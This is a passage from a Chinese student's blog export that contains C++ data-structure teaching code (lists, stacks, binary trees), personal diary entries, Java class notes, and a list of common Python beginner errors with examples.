for(int j=0;j&lt;=L.length-1;j++) cout&lt;&lt;L.elem[j]&lt;&lt;\" \"; cout&lt;&lt;endl;&#125;void DestroyList(SqList &amp;L)&#123; if (L.elem) delete []L.elem; //释放存储空间&#125;int main()&#123; SqList myL; int i,e,x; cout &lt;&lt; \"1. 初始化\\n\"; cout &lt;&lt; \"2. 创建\\n\"; cout &lt;&lt; \"3. 取值\\n\"; cout &lt;&lt; \"4. 查找\\n\"; cout &lt;&lt; \"5. 插入\\n\"; cout &lt;&lt; \"6. 删除\\n\"; cout &lt;&lt; \"7. 输出\\n\"; cout &lt;&lt; \"8. 销毁\\n\"; cout &lt;&lt; \"0. 退出\\n\"; int choose = -1; while (choose != 0) &#123; cout &lt;&lt; \"请选择:\"; cin &gt;&gt; choose; switch (choose) &#123; case 1://初始化顺序表 cout &lt;&lt; \"顺序表初始化...\" &lt;&lt;endl; if(InitList(myL)) cout &lt;&lt;\"顺序表初始化成功！\" &lt;&lt; endl; else cout &lt;&lt;\"顺序表初始化失败！\" &lt;&lt; endl; break; case 2://创建顺序表 cout &lt;&lt; \"顺序表创建...\" &lt;&lt;endl; cout &lt;&lt; \"输入整型数，输入-1结束\" &lt;&lt;endl; if(CreateList(myL)) cout &lt;&lt;\"顺序表创建成功！\" &lt;&lt; endl; else cout &lt;&lt;\"顺序表创建失败！\" &lt;&lt; endl; break; case 3://取值 cout &lt;&lt; \"输入整型数i，取第i个元素输出\" &lt;&lt;endl; cin&gt;&gt;i; if(GetElem(myL,i,e)) cout &lt;&lt;\"第i个元素是： \" &lt;&lt;e&lt;&lt; endl; else cout &lt;&lt;\"顺序表取值失败！\" &lt;&lt; endl;; cout &lt;&lt; \"第i个元素是： \"&lt;&lt;e&lt;&lt; endl; break; case 4://查找 cout &lt;&lt; \"请输入要查找的数x:\"; cin&gt;&gt;x; if(LocateELem(myL,x)==-1) cout &lt;&lt;\"查找失败！\" &lt;&lt; endl; else cout &lt;&lt;\"查找成功！\" &lt;&lt; endl; break; case 5://插入 cout &lt;&lt; \"请输入要插入的位置和要插入的数据元素e:\"; cin&gt;&gt;i&gt;&gt;e; if(ListInsert_Sq(myL,i,e)) cout &lt;&lt;\"插入成功！\" &lt;&lt; endl; else cout &lt;&lt;\"插入失败！\" &lt;&lt; endl; break; case 6://删除 cout &lt;&lt; \"请输入要删除的位置i:\"; cin&gt;&gt;i; if(ListDelete_Sq(myL,i,e)) cout &lt;&lt;\" 删除成功！\" &lt;&lt; endl; else cout &lt;&lt;\"删除失败！\" &lt;&lt; endl; break; case 7://输出 print(myL); break; case 8://销毁 cout &lt;&lt; \"顺序表销毁...\"&lt;&lt;endl; DestroyList(myL); break; &#125; &#125; return 0;&#125; 单链表基本操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;iomanip&gt;#include&lt;stdlib.h&gt;using namespace std;typedef struct LNode &#123; int data; //结点的数据域 struct LNode *next; //结点的指针域&#125;LNode, *LinkList; //LinkList为指向结构体LNode的指针类型bool InitList_L(LinkList &amp;L)//构造一个空的单链表L&#123; L=new LNode; //生成新结点作为头结点，用头指针L指向头结点 if(!L) return false; //生成结点失败 L-&gt;next=NULL; //头结点的指针域置空 return true;&#125;void CreateList_H(LinkList &amp;L)//前插法创建单链表&#123; //输入n个元素的值，建立到头结点的单链表L int n; LinkList s; //定义一个指针变量 L=new LNode; L-&gt;next=NULL; //先建立一个带头结点的空链表 cout &lt;&lt;\"请输入元素个数n：\" &lt;&lt;endl; cin&gt;&gt;n; cout &lt;&lt;\"请依次输入n个元素：\" &lt;&lt;endl; cout &lt;&lt;\"前插法创建单链表...\" &lt;&lt;endl; while(n--)&#123; s=new LNode; //生成新结点s cin&gt;&gt;s-&gt;data; //输入元素值赋给新结点的数据域 s-&gt;next=L-&gt;next; L-&gt;next=s; //将新结点s插入到头结点之后 &#125;&#125;void CreateList_R(LinkList &amp;L)//尾插法创建单链表&#123; //输入n个元素的值，建立带表头结点的单链表L int n; LinkList s, r; L=new LNode; L-&gt;next=NULL; //先建立一个带头结点的空链表 r=L; //尾指针r指向头结点 cout &lt;&lt;\"请输入元素个数n：\" &lt;&lt;endl; cin&gt;&gt;n; cout &lt;&lt;\"请依次输入n个元素：\" &lt;&lt;endl; cout &lt;&lt;\"尾插法创建单链表...\" &lt;&lt;endl; while(n--)&#123; s=new LNode;//生成新结点 cin&gt;&gt;s-&gt;data; //输入元素值赋给新结点的数据域 s-&gt;next=NULL; r-&gt;next=s;//将新结点s插入尾结点r之后 r=s;//r指向新的尾结点s &#125;&#125;bool GetElem_L(LinkList L, int i, int &amp;e)//单链表的取值&#123; //在带头结点的单链表L中查找第i个元素 //用e记录L中第i个数据元素的值 int j; LinkList p; p=L-&gt;next;//p指向第一个结点， j=1; //j为计数器 while (j&lt;i &amp;&amp; p) //顺链域向后扫描，直到p指向第i个元素或p为空&#123; p=p-&gt;next; //p指向下一个结点 j++; //计数器j相应加1 &#125; if (!p || j&gt;i) return false; //i值不合法i＞n或i&lt;=0 e=p-&gt;data; //取第i个结点的数据域 return true;&#125;bool LocateElem_L(LinkList L, int e) //按值查找&#123; //在带头结点的单链表L中查找值为e的元素 LinkList p; p=L-&gt;next; while (p &amp;&amp; p-&gt;data!=e)//顺链域向后扫描，直到p为空或p所指结点的数据域等于e p=p-&gt;next; //p指向下一个结点 if(!p)return false; //查找失败p为NULLreturn true;&#125;bool ListInsert_L(LinkList &amp;L, int i, int &amp;e)//单链表的插入&#123; //在带头结点的单链表L中第i个位置插入值为e的新结点 int j; LinkList p, s; p=L; j=0; while (p&amp;&amp;j&lt;i-1) //查找第i-1个结点，p指向该结点&#123; p=p-&gt;next; j++; &#125; if (!p || j&gt;i-1)//i＞n+1或者i＜1 return false; s=new LNode; //生成新结点 s-&gt;data=e; //将新结点的数据域置为e s-&gt;next=p-&gt;next; //将新结点的指针域指向结点ai p-&gt;next=s; //将结点p的指针域指向结点s return true;&#125;bool ListDelete_L(LinkList &amp;L, int i) //单链表的删除&#123; //在带头结点的单链表L中，删除第i个位置 LinkList p, q; int j; p=L; j=0; while((p-&gt;next)&amp;&amp;(j&lt;i-1)) //查找第i-1个结点，p指向该结点 &#123; p=p-&gt;next; j++; &#125; if (!(p-&gt;next)||(j&gt;i-1))//当i&gt;n或i&lt;1时，删除位置不合理 return false; q=p-&gt;next; //临时保存被删结点的地址以备释放空间 p-&gt;next=q-&gt;next; //改变删除结点前驱结点的指针域 delete q; //释放被删除结点的空间 return true;&#125;void Listprint_L(LinkList L) //单链表的输出&#123;LinkList p;p=L-&gt;next;while (p)&#123; cout &lt;&lt;p-&gt;data &lt;&lt;\"\\t\"; p=p-&gt;next;&#125;cout&lt;&lt;endl;&#125;int main()&#123; int i,x,e,choose; LinkList L; cout &lt;&lt; \"1. 初始化\\n\"; cout &lt;&lt; \"2. 创建单链表（前插法）\\n\"; cout &lt;&lt; \"3. 创建单链表（尾插法）\\n\"; cout &lt;&lt; \"4. 取值\\n\"; cout &lt;&lt; \"5. 查找\\n\"; cout &lt;&lt; \"6. 插入\\n\"; cout &lt;&lt; \"7. 删除\\n\"; cout &lt;&lt; \"8. 输出\\n\"; cout &lt;&lt; \"0. 退出\\n\"; choose=-1; while (choose!=0)&#123; cout&lt;&lt;\"请输入数字选择:\"; cin&gt;&gt;choose; switch (choose) &#123; case 1: //初始化一个空的单链表 if (InitList_L(L)) cout &lt;&lt; \"初始化一个空的单链表!\\n\"; break; case 2: //创建单链表（前插法） CreateList_H(L); cout &lt;&lt; \"前插法创建单链表输出结果:\\n\"; Listprint_L(L); break; case 3: //创建单链表（尾插法） CreateList_R(L); cout &lt;&lt; \"尾插法创建单链表输出结果:\\n\"; Listprint_L(L); break; case 4: //单链表的按序号取值 cout &lt;&lt; \"请输入一个位置i用来取值:\"; cin &gt;&gt; i; if (GetElem_L(L,i,e))&#123; cout &lt;&lt; \"查找成功\\n\"; cout &lt;&lt; \"第\" &lt;&lt; i &lt;&lt; \"个元素是：\"&lt;&lt;e&lt;&lt; endl; &#125; else cout &lt;&lt; \"查找失败\\n\\n\"; break; case 5: //单链表的按值查找 cout&lt;&lt;\"请输入所要查找元素x:\"; cin&gt;&gt;x; if (LocateElem_L(L,x)) cout &lt;&lt; \"查找成功\\n\"; else cout &lt;&lt; \"查找失败! \" &lt;&lt;endl; break; case 6: //单链表的插入 cout &lt;&lt; \"请输入插入的位置和元素（用空格隔开）:\"; cin &gt;&gt; i; cin &gt;&gt; x; if (ListInsert_L(L, i, x)) cout &lt;&lt; \"插入成功.\\n\\n\"; else cout &lt;&lt; \"插入失败!\\n\\n\"; break; case 7: //单链表的删除 cout&lt;&lt;\"请输入所要删除的元素位置i:\"; cin&gt;&gt;i; if (ListDelete_L(L, i)) cout&lt;&lt;\"删除成功!\\n\"; else cout&lt;&lt;\"删除失败!\\n\"; break; case 8: //单链表的输出 cout &lt;&lt; \"当前单链表的数据元素分别为:\\n\"; Listprint_L(L); cout &lt;&lt; endl; break; &#125; &#125; return 0;&#125; 顺序栈基本操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include&lt;iostream&gt;using namespace std;#define Maxsize 100 //预先分配空间，这个数值根据实际需要预估确定；typedef struct SqStack &#123; int *base; //栈底指针 int *top; //栈顶指针&#125;SqStack;bool InitStack(SqStack &amp;S) //构造一个空栈S&#123; S.base = new int[Maxsize];//为顺序栈分配一个最大容量为Maxsize的空间 if (!S.base) //空间分配失败 return false; S.top=S.base; //top初始为base，空栈 return true;&#125;bool Push(SqStack &amp;S, int e) // 插入元素e为新的栈顶元素&#123; if (S.top-S.base == Maxsize) //栈满 return false; *(S.top++) = e; //元素e压入栈顶，然后栈顶指针加1，等价于*S.top=e; S.top++; return true;&#125;bool Pop(SqStack &amp;S, int &amp;e) //删除S的栈顶元素，暂存在变量e中&#123; if (S.base == S.top) //栈空 return false; e = *(--S.top); //栈顶指针减1，将栈顶元素赋给e 等价于S.top--; e=*S.top; return true;&#125;int GetTop(SqStack S) //返回S的栈顶元素，栈顶指针不变&#123; if (S.top != S.base) //栈非空 return *(S.top - 1); //返回栈顶元素的值，栈顶指针不变 else return -1;&#125;int main()&#123; int n,x; SqStack S; InitStack(S);//初始化一个顺序栈S cout &lt;&lt;\"请输入元素个数n：\" &lt;&lt;endl; cin&gt;&gt;n; cout &lt;&lt;\"请依次输入n个元素，依次入栈：\" &lt;&lt;endl; while(n--) &#123; cin&gt;&gt;x; //输入元素 Push(S, x); &#125; cout &lt;&lt;\"元素依次出栈：\" &lt;&lt;endl; while(S.top!=S.base)//如果栈不空，则依次出栈 &#123; cout&lt;&lt;GetTop(S)&lt;&lt;\"\\t\";//输出栈顶元素 Pop(S, x); //栈顶元素出栈 &#125; return 0;&#125; 链栈基本操作1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include&lt;iostream&gt;using namespace std;typedef struct Snode &#123; int data; //数据域 struct Snode *next; //指针域&#125;Snode,*LinkStack;bool InitStack(LinkStack &amp;S) //构造一个空栈S&#123; S=NULL; return true;&#125;bool Push(LinkStack &amp;S, int e) //在栈顶插入元素e&#123; LinkStack p; p = new Snode; //生成新结点 p-&gt;data = e; //将e放在新结点数据域 p-&gt;next = S; //将新结点的指针域指向S，即将S的地址赋值给新结点的指针域 S = p; //修改栈顶指针为p return true;&#125;bool Pop(LinkStack &amp;S, int &amp;e) //删除S的栈顶元素，用e保存其值&#123; LinkStack p; if (S==NULL) //栈空 return false; e=S-&gt;data; //将栈顶元素赋给e p=S; //用p保存栈顶元素地址，以备释放 S=S-&gt;next; //修改栈顶指针，指向下一个结点 delete p; //释放原栈顶元素的空间 return true;&#125;int GetTop(LinkStack S) //返回S的栈顶元素，不修改栈顶指针&#123; if (S!=NULL) //栈非空 return S-&gt;data; //返回栈顶元素的值，栈顶指针不变elsereturn -1;&#125;int main()&#123; int n,x; LinkStack S; InitStack(S);//初始化一个顺序栈S cout &lt;&lt;\"请输入元素个数n：\" &lt;&lt;endl; cin&gt;&gt;n; cout &lt;&lt;\"请依次输入n个元素，依次入栈：\" &lt;&lt;endl; while(n--)&#123; cin&gt;&gt;x; //输入元素 Push(S, x); &#125; cout &lt;&lt;\"元素依次出栈：\" &lt;&lt;endl; while(S!=NULL)//如果栈不空，则依次出栈&#123;cout&lt;&lt;GetTop(S)&lt;&lt;\"\\t\";//输出栈顶元素Pop(S, x); //栈顶元素出栈&#125; return 0;&#125; 二叉树的创建123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;typedef struct Bnode /*定义二叉树存储结构*/&#123; char data; struct Bnode *lchild,*rchild;&#125;Bnode,*Btree;void createtree(Btree &amp;T) /*创建二叉树函数*/&#123; char check; /*判断是否创建左右孩子*/ T=new Bnode; cout&lt;&lt;\"请输入结点信息:\"&lt;&lt;endl; /*输入根结点数据*/ cin&gt;&gt;T-&gt;data; cout&lt;&lt;\"是否添加 \"&lt;&lt;T-&gt;data&lt;&lt;\"的左孩子? (Y/N)\"&lt;&lt;endl; /*询问是否创建T的左子树*/ cin&gt;&gt;check; if(check=='Y') createtree(T-&gt;lchild); else T-&gt;lchild=NULL; cout&lt;&lt;\"是否添加\"&lt;&lt;T-&gt;data&lt;&lt;\"的右孩子? (Y/N)\"&lt;&lt;endl; /*询问是否创建T的右子树*/ cin&gt;&gt;check; if(check=='Y') createtree(T-&gt;rchild); else T-&gt;rchild=NULL; return;&#125;int main()&#123; Btree mytree; createtree(mytree);/*创建二叉树*/ return 0;&#125; 二叉树的层次遍历123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;queue&gt; //引入队列头文件using namespace std;typedef struct Bnode /*定义二叉树存储结构*/&#123; char data; struct Bnode *lchild,*rchild;&#125;Bnode,*Btree;void Createtree(Btree &amp;T) /*创建二叉树函数*/&#123; //按先序次序输入二叉树中结点的值（一个字符），创建二叉链表表示的二叉树T char ch; cin &gt;&gt; ch; if(ch=='#') T=NULL; //递归结束，建空树 else &#123; T=new Bnode; T-&gt;data=ch; //生成根结点 Createtree(T-&gt;lchild); //递归创建左子树 Createtree(T-&gt;rchild); //递归创建右子树 &#125; return;&#125;bool Leveltraverse(Btree T) //层次遍历&#123; Btree p; if(!T) return false; queue&lt;Btree&gt;Q; //创建一个普通队列(先进先出)，里面存放指针类型 Q.push(T); //根指针入队 while(!Q.empty()) //如果队列不空 &#123; p=Q.front();//取出队头元素 Q.pop(); //队头元素出队 cout&lt;&lt;p-&gt;data&lt;&lt;\"\\t\"; if(p-&gt;lchild) Q.push(p-&gt;lchild); //左孩子指针入队 if(p-&gt;rchild) Q.push(p-&gt;rchild); //右孩子指针入队 &#125; return true;&#125;int main()&#123; Btree mytree; cout&lt;&lt;\"按先序次序输入二叉树中结点的值（孩子为空时输入#），创建一棵二叉树\"&lt;&lt;endl; Createtree(mytree);//创建二叉树 cout&lt;&lt;endl; cout&lt;&lt;\"二叉树的层次遍历结果：\"&lt;&lt;endl; Leveltraverse(mytree);//层次遍历二叉树 return 0;&#125;","categories":[],"tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://leo.dropsec.xyz/tags/数据结构与算法/"}]},{"title":"Just XXXX XXXX","slug":"Just-XXXX-XXXX","date":"2017-12-01T12:06:40.000Z","updated":"2018-07-30T13:33:40.083Z","comments":true,"path":"2017/12/01/Just-XXXX-XXXX/","link":"","permalink":"http://leo.dropsec.xyz/2017/12/01/Just-XXXX-XXXX/","excerpt":"还好，只是最近有点压抑、有点虚。","text":"还好，只是最近有点压抑、有点虚。 我还是那个我 遇事表面镇静而心里沉不下太多事的我 大了很多事没有之前那样在乎了然而有时候也会纠结那些不在乎的事甚至抓狂 手在不由自主的颤腿在不由自主的抖 其实最近过的挺好生活很平静 只不过还要努力按时完成作业深入理解每一个知识点提高学习效率不做好人 做好自己 真的最近我过的挺好只是有点压抑、有点虚","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]},{"title":"跟着崔岩老师学Java","slug":"跟着崔岩老师学Java","date":"2017-09-19T10:39:19.000Z","updated":"2019-02-10T14:55:19.352Z","comments":true,"path":"2017/09/19/跟着崔岩老师学Java/","link":"","permalink":"http://leo.dropsec.xyz/2017/09/19/跟着崔岩老师学Java/","excerpt":"之前在超星算是初步接触过Java，本学期有Java程序设计这门课，我是很高兴的。上过两节课，发现崔岩老师也很给力，更坚定了我学好Java的信心。 这里就用于记录我在崔老师的课堂上的点点收获吧","text":"之前在超星算是初步接触过Java，本学期有Java程序设计这门课，我是很高兴的。上过两节课，发现崔岩老师也很给力，更坚定了我学好Java的信心。 这里就用于记录我在崔老师的课堂上的点点收获吧 2017/9/19 Class命名首字母大写（约定），方法命名都要“传情达意”； Ctrl+Shift+f 自动缩进快捷键 （前提是没有语句漂红）； 桩模块（stub) 详细参考： http://blog.csdn.net/chenyt01/article/details/52216857 交互设计（Interaction Design）：定义、设计人造系统的行为的设计领域，它定义了两个或多个互动的个体之间交流的内容和结构，使之互相配合，共同达成某种目的 学会用程序员的思维去体验产品，体会到一点点feel就是之后自己开发产品时的目标（类似崔老师提到的以上交互设计…) 熟悉键盘： 一分钟至少中文30英文100. 2017/9/22 先接受，再评价；平和心态，没有什么东西是没用的，存在即是合理 学会以工程的思维去编码 (String[],args) &lt;==&gt; (String…,args) 偶然发现 refactor 重构（更改变量名） 程序员要学会“手贱”，用‘删除则不能’的方法搞懂每个东西的作用 Java里面只有void返回类型，不存在用void定义方法类型 对于工具书，先看前言与目录，然后在需要用的时候读 函数里不要有输出语句，运用返回值 main方法里只需有main一个方法即可 log4j插件 日志方式（替换输出) 4==for 2==to 2017/9/26 两个名词：回归测试、分而治之（本节课崔老师主要在示范程序规范与初步介绍debug.） 2017/9/29 【编程思想】：考虑用户不确定的需求，留意程序的本身特性，自己给自己加码工程意识、客户需求、容错性 模块化、函数化、流式化编程（本节课崔老师主要结合课后题目展开介绍编程思想） 2017/10/10 编写代码注意： 要有条理性、学会分而治之、（可配置可变化） （必要的“职业病”是可以有的） 精细的去做几道题目，从中学会扩散的挖掘知识比盲目做大量题目要好一点，在过程中总结体会真正的编程思想 不足之一：看资料看的太慢（知识储备太少） 之后第一遍读东西不用太细致，第一遍要去发掘其中的关键点 扩散——&gt;回车、多动手实践敲代码、又一次提到练打字、所有导包语句都不要自己写 2017/10/13 Ctrl+shift+o 自动导入所需包 Ctrl+shift+f 自动缩进 编译器的报错信息从下往上看 学会看源码。对比自己写的代码学习可学习之处 了解：数组扩容、泛型、多态 2017/10/17与2017/10/20的Java课由于机房预约问题未上，顺延一周 2017/10/24 从jdk 9开始变量名不推荐使用下划线”_”（课堂上，由于我们技能方面表现不佳，崔老师比较生气，未讲太多新知识） 2017/10/27 崔老师演示了创建数组新方法、数组与链表的一键转换以及Iterator 的用法 做工程时有些功能模块要学会引用（学习）别人（大牛）写的代码 要有好奇心呀，好奇心带我们翻越一座座山 2017/10/31 变量设置习惯：a b c…用来设置中间变量 m n o p q…用来设置整数变量 i j k…用来设置循环变量 函数块里尽量不要写输出语句 2017/11/4 @override 用于重写父类方法 了解Java怎么处理大数 哈希表的原理（为什么快） 明确目的。","categories":[],"tags":[{"name":"技术","slug":"技术","permalink":"http://leo.dropsec.xyz/tags/技术/"}]},{"title":"新手常见的17个Python运行时错误","slug":"新手常见的17个Python运行时错误","date":"2017-09-05T11:37:37.000Z","updated":"2019-02-10T14:49:39.004Z","comments":true,"path":"2017/09/05/新手常见的17个Python运行时错误/","link":"","permalink":"http://leo.dropsec.xyz/2017/09/05/新手常见的17个Python运行时错误/","excerpt":"早计划学习python了，最近一段时间才缓缓展开行动…自我感觉熟练python后可以很随意的编写程序，比C++方便多。","text":"早计划学习python了，最近一段时间才缓缓展开行动…自我感觉熟练python后可以很随意的编写程序，比C++方便多。 当初学 Python 时，想要弄懂 Python 的错误信息的含义可能有点复杂。这里列出了常见的的一些让你程序 crash 的运行时错误。 1）忘记在 if , elif , else , for , while , class ,def 声明末尾添加 ：（导致 “SyntaxError ：invalid syntax”） 该错误将发生在类似如下代码中： if spam == 42 print(&apos;Hello!&apos;) 2)使用 = 而不是 ==（导致“SyntaxError: invalid syntax”） = 是赋值操作符而 == 是等于比较操作。该错误发生在如下代码中： if spam = 42: print(&apos;Hello!&apos;) 3）错误的使用缩进量。（导致“IndentationError：unexpected indent”、“IndentationError：unindent does not match any outer indetation level”以及“IndentationError：expected an indented block”） 记住缩进增加只用在以：结束的语句之后，而之后必须恢复到之前的缩进格式。该错误发生在如下代码中： print(&apos;Hello!&apos;) print(&apos;Howdy!&apos;) 或者： if spam == 42: print(&apos;Hello!&apos;) print(&apos;Howdy!&apos;) 或者： if spam == 42: print(&apos;Hello!&apos;) 4）在 for 循环语句中忘记调用 len() (导致“TypeError: ‘list’ object cannot be interpreted as an integer”) 通常你想要通过索引来迭代一个list或者string的元素，这需要调用 range() 函数。要记得返回len 值而不是返回这个列表。 该错误发生在如下代码中： spam = [&apos;cat&apos;, &apos;dog&apos;, &apos;mouse&apos;] for i in range(spam): print(spam[i]) 5）尝试修改string的值（导致“TypeError: ‘str’ object does not support item assignment”） string是一种不可变的数据类型，该错误发生在如下代码中： spam = &apos;I have a pet cat.&apos; spam[13] = &apos;r&apos; print(spam) 而你实际想要这样做： spam = &apos;I have a pet cat.&apos; spam = spam[:13] + &apos;r&apos; + spam[14:] print(spam) 6）尝试连接非字符串值与字符串（导致 “TypeError: Can’t convert ‘int’ object to str implicitly”） 该错误发生在如下代码中： numEggs = 12 print(&apos;I have &apos; + numEggs + &apos; eggs.&apos;) 而你实际想要这样做： numEggs = 12 print(&apos;I have &apos; + str(numEggs) + &apos; eggs.&apos;) 或者： numEggs = 12 print(&apos;I have %s eggs.&apos; % (numEggs)) 7）在字符串首尾忘记加引号（导致“SyntaxError: EOL while scanning string literal”） 该错误发生在如下代码中： print(Hello!&apos;) 或者: print(&apos;Hello!) 或者: myName = &apos;Al&apos; print(&apos;My name is &apos; + myName + . How are you?&apos;) 8）变量或者函数名拼写错误（导致“NameError: name ‘fooba’ is not defined”） 该错误发生在如下代码中： foobar = &apos;Al&apos; print(&apos;My name is &apos; + fooba) 或者: spam = ruond(4.2) 或者: spam = Round(4.2) 9）方法名拼写错误（导致 “AttributeError: ‘str’ object has no attribute ‘lowerr’”） 该错误发生在如下代码中： spam = &apos;THIS IS IN LOWERCASE.&apos; spam = spam.lowerr() 10）引用超过list最大索引（导致“IndexError: list index out of range”） 该错误发生在如下代码中： spam = [&apos;cat&apos;, &apos;dog&apos;, &apos;mouse&apos;] print(spam[6]) 11）使用不存在的字典键值（导致“KeyError：‘spam’”） 该错误发生在如下代码中： spam = {&apos;cat&apos;: &apos;Zophie&apos;, &apos;dog&apos;: &apos;Basil&apos;, &apos;mouse&apos;: &apos;Whiskers&apos;} print(&apos;The name of my pet zebra is &apos; + spam[&apos;zebra&apos;]) 12）尝试使用Python关键字作为变量名（导致“SyntaxError：invalid syntax”） Python关键不能用作变量名，该错误发生在如下代码中： class = &apos;algebra&apos; Python3的关键字有：and, as, assert, break, class, continue, def, del, elif, else, except, False, finally, for, from, global, if, import, in, is, lambda, None, nonlocal, not, or, pass, raise, return, True, try, while, with, yield 13）在一个定义新变量中使用增值操作符（导致“NameError: name ‘foobar’ is not defined”） 不要在声明变量时使用0或者空字符串作为初始值，这样使用自增操作符的一句spam += 1等于spam = spam + 1，这意味着spam需要指定一个有效的初始值。 该错误发生在如下代码中： spam = 0 spam += 42 eggs += 42 14）在定义局部变量前在函数中使用局部变量（此时有与局部变量同名的全局变量存在）（导致“UnboundLocalError: local variable ‘foobar’ referenced before assignment”） 在函数中使用局部变来那个而同时又存在同名全局变量时是很复杂的，使用规则是：如果在函数中定义了任何东西，如果它只是在函数中使用那它就是局部的，反之就是全局变量。 这意味着你不能在定义它之前把它当全局变量在函数中使用。 该错误发生在如下代码中： someVar = 42 def myFunction(): print(someVar) someVar = 100 myFunction() 15）尝试使用 range()创建整数列表（导致“TypeError: ‘range’ object does not support item assignment”） 有时你想要得到一个有序的整数列表，所以 range() 看上去是生成此列表的不错方式。然而，你需要记住 range() 返回的是 “range object”，而不是实际的 list 值。 该错误发生在如下代码中： spam = range(10) spam[4] = -1 也许这才是你想做： spam = list(range(10)) spam[4] = -1 （注意：在 Python 2 中 spam = range(10) 是能行的，因为在 Python 2 中 range() 返回的是list值，但是在 Python 3 中就会产生以上错误） 16）不错在 ++ 或者 – 自增自减操作符。（导致“SyntaxError: invalid syntax”） 如果你习惯于例如 C++ , Java , PHP 等其他的语言，也许你会想要尝试使用 ++ 或者 – 自增自减一个变量。在Python中是没有这样的操作符的。 该错误发生在如下代码中： spam = 1 spam++ 也许这才是你想做的： spam = 1 spam += 1 17）忘记为方法的第一个参数添加self参数（导致“TypeError: myMethod() takes no arguments (1 given)”） 该错误发生在如下代码中： class Foo(): def myMethod(): print(&apos;Hello!&apos;) a = Foo() a.myMethod() 原文链接：http://www.oschina.net/question/89964_62779","categories":[],"tags":[{"name":"技术","slug":"技术","permalink":"http://leo.dropsec.xyz/tags/技术/"}]},{"title":"OK 天津","slug":"OK-天津","date":"2017-08-28T13:29:17.000Z","updated":"2018-07-30T13:19:46.711Z","comments":true,"path":"2017/08/28/OK-天津/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/28/OK-天津/","excerpt":"8.24–8.28 与三友共浪天津，回来之后迫不及待的想记录一点东西…","text":"8.24–8.28 与三友共浪天津，回来之后迫不及待的想记录一点东西… 多年前的我对天津是有某种情感的，小时候姥爷长期工作于天津，年时总会讲起它的点滴，渐渐的渐渐的便对它有了亲近感。但等姥爷去世后，时间一长那种情感也就渐渐随风而去，数一数，六七年了吧… 如今，走近天津，除了开始的要去追寻这座城的历史，其间也产生了去了解姥爷之前生活的土地的念头。 之于在天津的游玩，是没有必要细说的，简单记录下行踪便可：天津大学北洋园校区、天津市奥体中心全运会预演、东疆建设开发纪念公园、天津之眼(海河)、天津大学老校区、南开大学老校区、五大道古建筑群。 然后要说的便是自己的一些体会了：首先，重新谈一下天津印象，由于地处北方，跟之前有去过的广州、深圳等南方城市相比它是北方味道十足，不论是周遭的植被，还是建筑。其次便是资金流，天津身为直辖市之一本身就极具吸引力，又由于历史、地理位置等因素使其一直稳步向前发展，虽然自我感觉没有前几年发展的快了，但是实力并未减弱，稳中有实形容天津感觉比较恰当。最后便是天津人了，之前知道老北京人说话比较有特点，听后会感觉特别带劲，对于天津人的概念是比较模糊的，今日听闻，发现天津当地人说话同样自带特色，并且感觉和老北京人说话神似，听后心中默念：正宗正宗。 最后的最后抛开天津，谈一谈感想：其一：虽然我们几个可以说都是自诩肚子里有点笔墨的人，但是并不意味着在现实生活中就会比其他人具有某些优势，很多东西我们只会在书本上熟练的运用，实际生活中的行为总会显得有点幼稚、可笑…其二：城市穿梭之间，一浪友对我说感觉大城市都是一样的、都是单调的高楼与乏味的繁华。细细一想，一方水土一方人，人与文化是一座城市的灵魂，现如今我们大部分人都将重心放在了其他地方，对主体的人与人所产生的文化有所忽略，又怎么会去深入的了解这方水土，这座城市呢？因此会感觉不到这方水土这座城市的特色，发出“一样”的感叹。不怪本地的建设者，也怪不得他方的游人。。。 其三：年轻的时候还是有必要到处走走的，去多一点的地方、见多一点的人，虽然这是我的一贯看法，其实自我感觉我做的也不好，有点优柔、有点寡断。读书与运动总要有一个在路上，其中读书不只是表象的阅读有字书本还应包含无字的天地之书。而反思一下，读书与运动这两者我怠慢了好多。 其四：让我发句牢骚：好多你坚信行不通的东西在别人看来可能是行得通的。","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]},{"title":"十天的放逐","slug":"十天的放逐","date":"2017-08-08T02:59:26.000Z","updated":"2018-07-30T13:00:56.713Z","comments":true,"path":"2017/08/08/十天的放逐/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/08/十天的放逐/","excerpt":"就是这样如此巧合 2017.8.7 返校 立秋我已经进入了秋天","text":"就是这样如此巧合 2017.8.7 返校 立秋我已经进入了秋天7.27–8.7 整整在家呆了十天上大学以来 这是第三次回家自小到大 跟大部分同龄人相比回家好像对于我来说好像没有特别大的诱惑力 小学一个月回一次家高中几个星期回一次家到现在可能一年回几次家都是如此我不会像其他人那样焦急地去等待 该回家的时候拎起书包回家不该回家回家的时候不去过多的想念这好像就是我回家的一贯原则因此 不止一个人曾称呼我为野孩子哈哈哈。。。 十天的前几天回老家看望爷爷其他时间都在县城里和一部分好友聚了聚骑车在熟悉的县城里逛了逛其他时间也就那样什么也没干 让我感到惭愧的是我没能正真的、深层次的去理解自己的父母与家庭几天之中还是把自己最坏的脾气展示给了最亲的人 对于我来说每回一次家都是对自己精神的一次洗礼让我重新认识自己其中，我的亲人是主要的讲师 ………………………………….暑假还剩不到一个月其中大约有五天计划和朋友去趟天津剩下大约二十天对我来说是一个黄金时间也应该是我暑假浓墨重彩的一笔简单立个Flag: 每天至少上传一个自己感觉有价值的逆向题目WP。最后至少需要有二十个题解。 抽时间学习一下Py,能写出简单的脚本。 多看别人的博客，学习新东西。 追随逐梦者的脚步","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]},{"title":"汇编语言 王爽 